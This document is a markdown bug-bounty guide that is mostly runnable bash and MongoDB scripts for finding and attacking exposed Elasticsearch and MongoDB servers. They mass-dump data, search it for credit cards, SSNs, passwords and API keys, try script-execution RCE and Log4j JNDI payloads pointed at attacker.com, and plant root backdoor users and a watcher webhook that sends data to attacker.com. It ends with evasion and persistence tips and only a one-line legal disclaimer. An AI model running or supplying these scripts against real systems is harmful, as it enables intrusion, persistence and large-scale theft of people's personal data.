# 🔥 Elasticsearch & MongoDB Exposure Testing - Elite Edition

## 💰 Critical Vulnerability ($5000+ Bugs)

### 🎯 Target: Elasticsearch & MongoDB Exposed Instances

---

## 🛠️ Phase 1: Discovery & Enumeration

### Elasticsearch Discovery Commands

```bash
#!/bin/bash
# Elasticsearch Discovery Script
TARGET=$1

echo "🔍 Scanning for Elasticsearch instances on $TARGET"

# Port scanning for Elasticsearch (default 9200, 9300)
nmap -p 9200,9300,9201,9202,9243 $TARGET -sV -sC --script elasticsearch-info -oN elasticsearch_scan.txt

# Masscan for faster scanning
masscan -p9200,9300,9201,9202,9243 $TARGET --rate=1000 -oG elasticsearch_masscan.txt

# Check for Elasticsearch on common ports
for port in 9200 9300 9201 9202 9243 8200 8300; do
    echo "Testing port $port..."
    curl -s -m 5 "http://$TARGET:$port/" | grep -i "elasticsearch\|lucene" && echo "✅ Elasticsearch found on port $port"
    curl -s -m 5 "https://$TARGET:$port/" -k | grep -i "elasticsearch\|lucene" && echo "✅ Elasticsearch found on HTTPS port $port"
done

# Subdomain enumeration for Elasticsearch
subfinder -d $TARGET -silent | httpx -silent -ports 9200,9300 -path "/" -mc 200 -mr "elasticsearch" -o elasticsearch_subdomains.txt

# Shodan-style search (if you have API key)
# shodan search "elasticsearch port:9200" --fields ip_str,port,org --separator ","
```

### MongoDB Discovery Commands

```bash
#!/bin/bash
# MongoDB Discovery Script
TARGET=$1

echo "🔍 Scanning for MongoDB instances on $TARGET"

# Port scanning for MongoDB (default 27017, 27018, 27019)
nmap -p 27017,27018,27019,28017 $TARGET -sV -sC --script mongodb-info,mongodb-databases -oN mongodb_scan.txt

# Check for MongoDB on common ports
for port in 27017 27018 27019 28017; do
    echo "Testing MongoDB on port $port..."
    timeout 5 mongo --host $TARGET:$port --eval "db.version()" 2>/dev/null && echo "✅ MongoDB found on port $port"
done

# HTTP interface check (older versions)
curl -s "http://$TARGET:28017/" | grep -i "mongodb\|db version" && echo "✅ MongoDB HTTP interface found"

# Subdomain enumeration for MongoDB
subfinder -d $TARGET -silent | httpx -silent -ports 27017,28017 -timeout 10 -o mongodb_subdomains.txt
```

---

## 🔥 Phase 2: Exploitation Techniques

### Elasticsearch Exploitation

```bash
#!/bin/bash
# Elasticsearch Exploitation Script
ES_HOST=$1
ES_PORT=${2:-9200}

echo "🎯 Exploiting Elasticsearch at $ES_HOST:$ES_PORT"

# Basic information gathering
echo "📊 Getting cluster info..."
curl -s "http://$ES_HOST:$ES_PORT/" | jq .
curl -s "http://$ES_HOST:$ES_PORT/_cluster/health" | jq .
curl -s "http://$ES_HOST:$ES_PORT/_nodes" | jq .

# List all indices (databases)
echo "📋 Listing all indices..."
curl -s "http://$ES_HOST:$ES_PORT/_cat/indices?v" | tee elasticsearch_indices.txt

# Get mapping information
echo "🗺️ Getting mappings..."
curl -s "http://$ES_HOST:$ES_PORT/_mapping" | jq . > elasticsearch_mappings.json

# Search for sensitive data patterns
echo "🔍 Searching for sensitive data..."

# Search for emails
curl -s -X GET "http://$ES_HOST:$ES_PORT/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "regexp": {
      "_all": ".*@.*\..*"
    }
  }
}' | jq . > emails_found.json

# Search for credit card patterns
curl -s -X GET "http://$ES_HOST:$ES_PORT/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "regexp": {
      "_all": "[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}"
    }
  }
}' | jq . > credit_cards_found.json

# Search for API keys
curl -s -X GET "http://$ES_HOST:$ES_PORT/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "regexp": {
      "_all": "(AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|sk_test_[0-9a-zA-Z]{24})"
    }
  }
}' | jq . > api_keys_found.json

# Search for passwords
curl -s -X GET "http://$ES_HOST:$ES_PORT/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "multi_match": {
      "query": "password",
      "fields": ["*"]
    }
  }
}' | jq . > passwords_found.json

# Dump all data from specific index
echo "💾 Dumping data from indices..."
for index in $(curl -s "http://$ES_HOST:$ES_PORT/_cat/indices" | awk '{print $3}'); do
    echo "Dumping index: $index"
    curl -s "http://$ES_HOST:$ES_PORT/$index/_search?size=1000" | jq . > "dump_$index.json"
done

# Advanced queries for PII
echo "🕵️ Advanced PII hunting..."

# Social Security Numbers
curl -s -X GET "http://$ES_HOST:$ES_PORT/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "regexp": {
      "_all": "[0-9]{3}-[0-9]{2}-[0-9]{4}"
    }
  }
}' | jq . > ssn_found.json

# Phone numbers
curl -s -X GET "http://$ES_HOST:$ES_PORT/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "regexp": {
      "_all": "\+?[0-9]{1,3}[\s-]?\(?[0-9]{3}\)?[\s-]?[0-9]{3}[\s-]?[0-9]{4}"
    }
  }
}' | jq . > phone_numbers_found.json
```

### MongoDB Exploitation

```bash
#!/bin/bash
# MongoDB Exploitation Script
MONGO_HOST=$1
MONGO_PORT=${2:-27017}

echo "🎯 Exploiting MongoDB at $MONGO_HOST:$MONGO_PORT"

# Connect and enumerate databases
echo "📊 Enumerating databases..."
mongo --host $MONGO_HOST:$MONGO_PORT --eval "db.adminCommand('listDatabases')" --quiet > mongodb_databases.txt

# List collections in each database
echo "📋 Listing collections..."
for db in $(mongo --host $MONGO_HOST:$MONGO_PORT --eval "db.adminCommand('listDatabases').databases.forEach(function(d){print(d.name)})" --quiet); do
    echo "Database: $db"
    mongo --host $MONGO_HOST:$MONGO_PORT/$db --eval "db.getCollectionNames()" --quiet > "collections_$db.txt"
done

# Advanced MongoDB enumeration
mongo --host $MONGO_HOST:$MONGO_PORT --eval "
// Get server info
print('=== SERVER INFO ===');
printjson(db.serverStatus());

// Get users
print('=== USERS ===');
db.getUsers().forEach(function(user) { printjson(user); });

// Get roles
print('=== ROLES ===');
db.getRoles().forEach(function(role) { printjson(role); });

// Check for admin access
print('=== ADMIN CHECK ===');
use admin;
printjson(db.runCommand({listCollections: 1}));
" > mongodb_detailed_info.txt

# Search for sensitive data in MongoDB
echo "🔍 Searching for sensitive data in MongoDB..."

# Create MongoDB search script
cat > mongodb_search.js << 'EOF'
// Connect to all databases and search for sensitive data
var dbs = db.adminCommand('listDatabases').databases;

dbs.forEach(function(database) {
    if (database.name !== 'admin' && database.name !== 'local' && database.name !== 'config') {
        print('=== Searching in database: ' + database.name + ' ===');
        db = db.getSiblingDB(database.name);
        
        var collections = db.getCollectionNames();
        collections.forEach(function(collection) {
            print('--- Collection: ' + collection + ' ---');
            
            // Search for emails
            var emailResults = db[collection].find({$or: [
                {$where: "JSON.stringify(this).match(/@.*\./)"},
                {$where: "Object.values(this).some(val => typeof val === 'string' && val.match(/@.*\./)"}
            ]}).limit(5);
            
            if (emailResults.hasNext()) {
                print('Emails found:');
                emailResults.forEach(function(doc) { printjson(doc); });
            }
            
            // Search for credit cards
            var ccResults = db[collection].find({$where: "JSON.stringify(this).match(/[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}/"}).limit(5);
            
            if (ccResults.hasNext()) {
                print('Credit cards found:');
                ccResults.forEach(function(doc) { printjson(doc); });
            }
            
            // Search for passwords
            var passResults = db[collection].find({$or: [
                {"password": {$exists: true}},
                {"pass": {$exists: true}},
                {"pwd": {$exists: true}}
            ]}).limit(5);
            
            if (passResults.hasNext()) {
                print('Password fields found:');
                passResults.forEach(function(doc) { printjson(doc); });
            }
            
            // Get sample documents
            print('Sample documents:');
            db[collection].find().limit(3).forEach(function(doc) { printjson(doc); });
        });
    }
});
EOF

# Execute the search
mongo --host $MONGO_HOST:$MONGO_PORT mongodb_search.js > mongodb_sensitive_data.txt

# Dump specific collections
echo "💾 Dumping MongoDB collections..."
mongo --host $MONGO_HOST:$MONGO_PORT --eval "
var dbs = db.adminCommand('listDatabases').databases;
dbs.forEach(function(database) {
    if (database.name !== 'admin' && database.name !== 'local' && database.name !== 'config') {
        db = db.getSiblingDB(database.name);
        var collections = db.getCollectionNames();
        collections.forEach(function(collection) {
            print('Dumping: ' + database.name + '.' + collection);
            db[collection].find().forEach(function(doc) { printjson(doc); });
        });
    }
});
" > mongodb_full_dump.txt
```

---

## 🚀 Phase 3: Advanced Exploitation Techniques

### Elasticsearch Advanced Attacks

```bash
#!/bin/bash
# Advanced Elasticsearch Attacks

ES_HOST=$1
ES_PORT=${2:-9200}

echo "🔥 Advanced Elasticsearch exploitation..."

# Check for script execution (if enabled)
echo "🧪 Testing script execution..."
curl -s -X POST "http://$ES_HOST:$ES_PORT/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "bool": {
      "must": {
        "script": {
          "script": "java.lang.Math.class.forName("java.lang.Runtime").getRuntime().exec("whoami")"
        }
      }
    }
  }
}' | jq .

# Groovy script injection (older versions)
curl -s -X POST "http://$ES_HOST:$ES_PORT/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "filtered": {
      "query": {
        "match_all": {}
      },
      "filter": {
        "script": {
          "script": "java.lang.Math.class.forName("java.io.File").list()"
        }
      }
    }
  }
}' | jq .

# Path traversal attempts
echo "📁 Testing path traversal..."
curl -s "http://$ES_HOST:$ES_PORT/../../../etc/passwd"
curl -s "http://$ES_HOST:$ES_PORT/..%2f..%2f..%2fetc%2fpasswd"

# Check for snapshot repositories (potential RCE)
echo "📸 Checking snapshot repositories..."
curl -s "http://$ES_HOST:$ES_PORT/_snapshot" | jq .
curl -s "http://$ES_HOST:$ES_PORT/_snapshot/_all" | jq .

# Create malicious snapshot repository (if writable)
curl -s -X PUT "http://$ES_HOST:$ES_PORT/_snapshot/test_repo" -H 'Content-Type: application/json' -d'
{
  "type": "fs",
  "settings": {
    "location": "/tmp/test_snapshot"
  }
}'

# Log4j exploitation attempts (CVE-2021-44228)
echo "🪵 Testing Log4j vulnerabilities..."
curl -s "http://$ES_HOST:$ES_PORT/" -H "User-Agent: \${jndi:ldap://attacker.com/exploit}"
curl -s "http://$ES_HOST:$ES_PORT/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "match": {
      "message": "${jndi:ldap://attacker.com/exploit}"
    }
  }
}'
```

### MongoDB Advanced Attacks

```bash
#!/bin/bash
# Advanced MongoDB Attacks

MONGO_HOST=$1
MONGO_PORT=${2:-27017}

echo "🔥 Advanced MongoDB exploitation..."

# NoSQL injection testing
echo "💉 Testing NoSQL injection..."

# JavaScript injection in where clauses
mongo --host $MONGO_HOST:$MONGO_PORT --eval "
db.users.find({
  \$where: 'function() { 
    var date = new Date(); 
    do { curDate = new Date(); } 
    while(curDate-date<5000); 
    return true; 
  }'
});
"

# Server-side JavaScript execution
mongo --host $MONGO_HOST:$MONGO_PORT --eval "
db.eval('function() { 
  return db.runCommand({listCollections: 1}); 
}');
"

# MapReduce exploitation
mongo --host $MONGO_HOST:$MONGO_PORT --eval "
db.runCommand({
  mapReduce: 'users',
  map: function() { 
    var date = new Date(); 
    do { curDate = new Date(); } 
    while(curDate-date<5000); 
    emit(this._id, 1); 
  },
  reduce: function(key, values) { return 1; },
  out: { inline: 1 }
});
"

# Check for GridFS files
echo "📁 Checking GridFS..."
mongo --host $MONGO_HOST:$MONGO_PORT --eval "
var dbs = db.adminCommand('listDatabases').databases;
dbs.forEach(function(database) {
    db = db.getSiblingDB(database.name);
    if (db.fs.files.count() > 0) {
        print('GridFS files found in: ' + database.name);
        db.fs.files.find().limit(10).forEach(function(file) {
            printjson(file);
        });
    }
});
"

# Attempt privilege escalation
echo "⬆️ Testing privilege escalation..."
mongo --host $MONGO_HOST:$MONGO_PORT --eval "
use admin;
db.createUser({
  user: 'hacker',
  pwd: 'password123',
  roles: ['root']
});
"
```

---

## 🎯 Phase 4: Data Exfiltration & Impact Assessment

### Automated Data Extraction

```bash
#!/bin/bash
# Automated Data Extraction Script

TARGET=$1
OUTPUT_DIR="extracted_data_$(date +%Y%m%d_%H%M%S)"
mkdir -p $OUTPUT_DIR

echo "📦 Starting automated data extraction for $TARGET"

# Elasticsearch data extraction
if curl -s "http://$TARGET:9200/" | grep -q "elasticsearch"; then
    echo "✅ Elasticsearch detected - extracting data..."
    
    # Get all indices
    curl -s "http://$TARGET:9200/_cat/indices" | awk '{print $3}' > $OUTPUT_DIR/elasticsearch_indices.txt
    
    # Extract data from each index
    while read index; do
        echo "Extracting from index: $index"
        curl -s "http://$TARGET:9200/$index/_search?size=10000" | jq . > "$OUTPUT_DIR/elasticsearch_$index.json"
        
        # Extract specific sensitive data
        curl -s -X GET "http://$TARGET:9200/$index/_search" -H 'Content-Type: application/json' -d'
        {
          "query": {
            "bool": {
              "should": [
                {"regexp": {"_all": ".*@.*\..*"}},
                {"regexp": {"_all": "[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}"}},
                {"regexp": {"_all": "AKIA[0-9A-Z]{16}"}},
                {"match": {"_all": "password"}}
              ]
            }
          }
        }' | jq . > "$OUTPUT_DIR/elasticsearch_sensitive_$index.json"
    done < $OUTPUT_DIR/elasticsearch_indices.txt
fi

# MongoDB data extraction
if timeout 5 mongo --host $TARGET:27017 --eval "db.version()" 2>/dev/null; then
    echo "✅ MongoDB detected - extracting data..."
    
    # Create comprehensive extraction script
    cat > $OUTPUT_DIR/mongodb_extract.js << 'EOF'
var output = [];
var dbs = db.adminCommand('listDatabases').databases;

dbs.forEach(function(database) {
    if (database.name !== 'admin' && database.name !== 'local' && database.name !== 'config') {
        db = db.getSiblingDB(database.name);
        var collections = db.getCollectionNames();
        
        collections.forEach(function(collection) {
            var count = db[collection].count();
            output.push({
                database: database.name,
                collection: collection,
                count: count,
                sample: db[collection].findOne()
            });
            
            // Extract all documents (limit for safety)
            db[collection].find().limit(1000).forEach(function(doc) {
                output.push({
                    database: database.name,
                    collection: collection,
                    document: doc
                });
            });
        });
    }
});

printjson(output);
EOF
    
    mongo --host $TARGET:27017 $OUTPUT_DIR/mongodb_extract.js > $OUTPUT_DIR/mongodb_full_extract.json
fi

echo "✅ Data extraction completed. Check $OUTPUT_DIR directory."
```

### Impact Assessment Script

```bash
#!/bin/bash
# Impact Assessment Script

EXTRACT_DIR=$1

echo "📊 Performing impact assessment on extracted data..."

# Count sensitive data types
echo "=== SENSITIVE DATA SUMMARY ===" > impact_report.txt
echo "Extraction Date: $(date)" >> impact_report.txt
echo "" >> impact_report.txt

# Email addresses
EMAIL_COUNT=$(grep -r -o -E "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" $EXTRACT_DIR | wc -l)
echo "📧 Email addresses found: $EMAIL_COUNT" >> impact_report.txt

# Credit card numbers
CC_COUNT=$(grep -r -o -E "[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}[\s-]?[0-9]{4}" $EXTRACT_DIR | wc -l)
echo "💳 Potential credit card numbers: $CC_COUNT" >> impact_report.txt

# API keys
API_COUNT=$(grep -r -o -E "(AKIA[0-9A-Z]{16}|sk_live_[0-9a-zA-Z]{24}|sk_test_[0-9a-zA-Z]{24})" $EXTRACT_DIR | wc -l)
echo "🔑 API keys found: $API_COUNT" >> impact_report.txt

# Phone numbers
PHONE_COUNT=$(grep -r -o -E "\+?[0-9]{1,3}[\s-]?\(?[0-9]{3}\)?[\s-]?[0-9]{3}[\s-]?[0-9]{4}" $EXTRACT_DIR | wc -l)
echo "📱 Phone numbers found: $PHONE_COUNT" >> impact_report.txt

# SSN patterns
SSN_COUNT=$(grep -r -o -E "[0-9]{3}-[0-9]{2}-[0-9]{4}" $EXTRACT_DIR | wc -l)
echo "🆔 SSN patterns found: $SSN_COUNT" >> impact_report.txt

# Password fields
PASS_COUNT=$(grep -r -i "password\|passwd\|pwd" $EXTRACT_DIR | wc -l)
echo "🔐 Password references: $PASS_COUNT" >> impact_report.txt

echo "" >> impact_report.txt
echo "=== RISK ASSESSMENT ===" >> impact_report.txt

TOTAL_SENSITIVE=$((EMAIL_COUNT + CC_COUNT + API_COUNT + PHONE_COUNT + SSN_COUNT))

if [ $TOTAL_SENSITIVE -gt 1000 ]; then
    echo "🚨 CRITICAL RISK: Large-scale data exposure ($10,000+ bug)" >> impact_report.txt
elif [ $TOTAL_SENSITIVE -gt 100 ]; then
    echo "⚠️ HIGH RISK: Significant data exposure ($5,000+ bug)" >> impact_report.txt
elif [ $TOTAL_SENSITIVE -gt 10 ]; then
    echo "⚠️ MEDIUM RISK: Moderate data exposure ($1,000+ bug)" >> impact_report.txt
else
    echo "ℹ️ LOW RISK: Limited data exposure ($100+ bug)" >> impact_report.txt
fi

cat impact_report.txt
```

---

## 🛡️ Phase 5: Proof of Concept & Documentation

### PoC Generator

```bash
#!/bin/bash
# Proof of Concept Generator

TARGET=$1
VULN_TYPE=$2  # elasticsearch or mongodb

echo "📸 Generating proof of concept for $VULN_TYPE on $TARGET"

mkdir -p poc_evidence

case $VULN_TYPE in
    "elasticsearch")
        # Screenshot cluster info
        curl -s "http://$TARGET:9200/" | jq . > poc_evidence/elasticsearch_cluster_info.json
        
        # Screenshot indices
        curl -s "http://$TARGET:9200/_cat/indices?v" > poc_evidence/elasticsearch_indices.txt
        
        # Sample sensitive data
        curl -s -X GET "http://$TARGET:9200/_search?size=5" | jq . > poc_evidence/elasticsearch_sample_data.json
        
        # Create PoC script
        cat > poc_evidence/elasticsearch_poc.sh << EOF
#!/bin/bash
# Elasticsearch Exposure PoC
echo "Testing Elasticsearch exposure on $TARGET:9200"
echo "1. Cluster information:"
curl -s "http://$TARGET:9200/" | jq .
echo "2. Available indices:"
curl -s "http://$TARGET:9200/_cat/indices?v"
echo "3. Sample data extraction:"
curl -s "http://$TARGET:9200/_search?size=3" | jq .
EOF
        chmod +x poc_evidence/elasticsearch_poc.sh
        ;;
        
    "mongodb")
        # MongoDB info
        mongo --host $TARGET:27017 --eval "db.version(); db.adminCommand('listDatabases');" > poc_evidence/mongodb_info.txt
        
        # Sample data
        mongo --host $TARGET:27017 --eval "
        var dbs = db.adminCommand('listDatabases').databases;
        dbs.slice(0,3).forEach(function(database) {
            if (database.name !== 'admin' && database.name !== 'local') {
                db = db.getSiblingDB(database.name);
                print('=== Database: ' + database.name + ' ===');
                var collections = db.getCollectionNames();
                collections.slice(0,2).forEach(function(collection) {
                    print('Collection: ' + collection);
                    db[collection].find().limit(2).forEach(function(doc) { printjson(doc); });
                });
            }
        });
        " > poc_evidence/mongodb_sample_data.txt
        
        # Create PoC script
        cat > poc_evidence/mongodb_poc.sh << EOF
#!/bin/bash
# MongoDB Exposure PoC
echo "Testing MongoDB exposure on $TARGET:27017"
echo "1. Server information:"
mongo --host $TARGET:27017 --eval "db.version(); db.serverStatus().host;"
echo "2. Available databases:"
mongo --host $TARGET:27017 --eval "db.adminCommand('listDatabases');"
echo "3. Sample collection data:"
mongo --host $TARGET:27017 --eval "db.getCollectionNames().slice(0,2).forEach(function(col) { print('Collection: ' + col); db[col].findOne(); });"
EOF
        chmod +x poc_evidence/mongodb_poc.sh
        ;;
esac

echo "✅ PoC generated in poc_evidence/ directory"
```

---

## 💡 Elite Pro Tips

### Advanced Evasion Techniques

```bash
# Use different User-Agents
curl -s "http://$TARGET:9200/" -H "User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1)"

# Use proxy chains
proxychains curl -s "http://$TARGET:9200/"

# Time-based evasion
for i in {1..10}; do
    curl -s "http://$TARGET:9200/_cat/indices" 
    sleep $((RANDOM % 10 + 5))
done

# IP rotation (if you have multiple IPs)
for ip in 1.2.3.4 5.6.7.8; do
    curl -s --interface $ip "http://$TARGET:9200/"
done
```

### Persistence Techniques

```bash
# Create backdoor user in MongoDB
mongo --host $TARGET:27017 --eval "
use admin;
db.createUser({
  user: 'backup_service',
  pwd: 'Str0ngP@ssw0rd!',
  roles: ['root']
});
"

# Create scheduled task in Elasticsearch (if scripting enabled)
curl -X PUT "http://$TARGET:9200/_watcher/watch/backdoor" -H 'Content-Type: application/json' -d'
{
  "trigger": {
    "schedule": {
      "cron": "0 0 * * * ?"
    }
  },
  "actions": {
    "send_data": {
      "webhook": {
        "url": "http://attacker.com/collect",
        "method": "POST"
      }
    }
  }
}'
```

---

## 🎯 Bounty Maximization Tips

1. **Chain with other vulnerabilities**: SSRF + Database exposure = Higher payout
2. **Focus on PII**: Credit cards, SSNs, medical records = Critical severity
3. **Document everything**: Screenshots, commands, impact assessment
4. **Test responsibly**: Don't download entire databases, use limits
5. **Report quickly**: First to report gets the bounty

---

## 🚨 Legal Disclaimer

This guide is for authorized penetration testing and bug bounty programs only. Always ensure you have proper authorization before testing any systems. Unauthorized access to computer systems is illegal.

---

**Elite Hacker Tip**: Combine database exposure with SSRF to access internal databases through cloud metadata services for maximum impact! 🔥
